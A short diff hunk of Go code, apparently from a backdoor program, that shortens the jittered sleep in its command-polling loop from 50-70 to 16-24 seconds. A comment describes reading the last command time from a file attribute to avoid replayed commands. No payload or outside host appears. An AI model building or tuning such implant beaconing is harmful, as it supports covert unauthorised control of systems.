@@ -159,7 +159,7 @@ func BackdoorLoop() {
 }
 
 func SleepWithJitter() {
-	time.Sleep(time.Second * time.Duration((60 + (rand.IntN(21) - 10)))) // random delay between 50-70 seconds
+	time.Sleep(time.Second * time.Duration((20 + (rand.IntN(9) - 4)))) // random delay between 16-24 seconds
 }
 
 // reads last command time from the xaddr attribute of the binary, so we don't repeat commands (and are immune to replay attacks)
